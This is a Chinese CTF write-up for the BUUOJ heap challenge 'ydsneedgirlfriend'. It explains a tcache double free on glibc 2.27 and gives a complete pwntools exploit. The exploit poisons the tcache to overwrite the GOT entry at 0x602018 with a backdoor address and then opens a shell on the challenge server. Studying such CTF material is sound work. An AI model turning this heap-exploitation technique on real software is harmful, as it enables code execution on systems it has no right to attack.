# ydsneedgirlfriend

一开始跳过了这题，原来还是有堆题的。。。有一处后门。

![s9iORP](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/s9iORP.png)

审题：

malloc部分

​	每次malloc的指针都会被放在girlfriend数组第一位，下次一malloc会覆盖上一次保存的指针。因此，同一时间段只能保持最近malloc的chunk可控

free部分

​	free会清除malloc空间的指针，但是不会清除girlfriend数组内的指针

通过free两次girlfriend指向的空间，造成double free。

```
malloc(0x20,"AAAAAA")
malloc(0x20,"BBBBBB")
free(0)
free(0) #double free
malloc(0x20,p64(0x000000000602018-0x23-0x8))
```

因为是2.27，所以有[tcachebins](https://xz.aliyun.com/t/6828)，这个在gef里是看不到，所以需要注意。我对于tcachebins不太了解，不过据说这个机制的检测比较少，刚才的double free也没有被检测出来（如果是fastbin估计早就corrupt了）

![insrSw](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/insrSw.png)

直接EXP

```python
#!/usr/bin/python
from pwn import *

r  = lambda data	:p.recv(data)
ru = lambda data 	:p.recvuntil(data)
s  = lambda data	:p.send(data)
sl = lambda data	:p.sendline(data)

def malloc(size,data):
	ru("u choice :")
	sl(str(1))
	ru("Please input the length of her name:")
	sl(str(size))
	ru("Please tell me her name:")
	s(data)

def free(index):
	ru("u choice :")
	sl(str(2))
	ru("Index :")
	sl(str(index))

def show(index):
	ru("u choice :")
	sl(str(3))
	ru("Index :")
	sl(str(index))

context.log_level='Debug'
#p=process("./ydsneedgirlfriend2.dms",env={"LD_PRELOAD":"libc-2.27.so"})
p=remote('node3.buuoj.cn',27011)
#gdb.attach(p)
backdoor=0x400D86

malloc(0x20,"AAAAAA")
malloc(0x20,"BBBBBB")
free(0)
free(0) #double free
malloc(0x20,p64(0x000000000602018))
malloc(0x10,p64(0x000000000602018))
malloc(0x10,p64(0x000000000602018))
malloc(0x10,p64(backdoor))
free(0)
p.interactive()
```



![eoKLDx](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/eoKLDx.png)

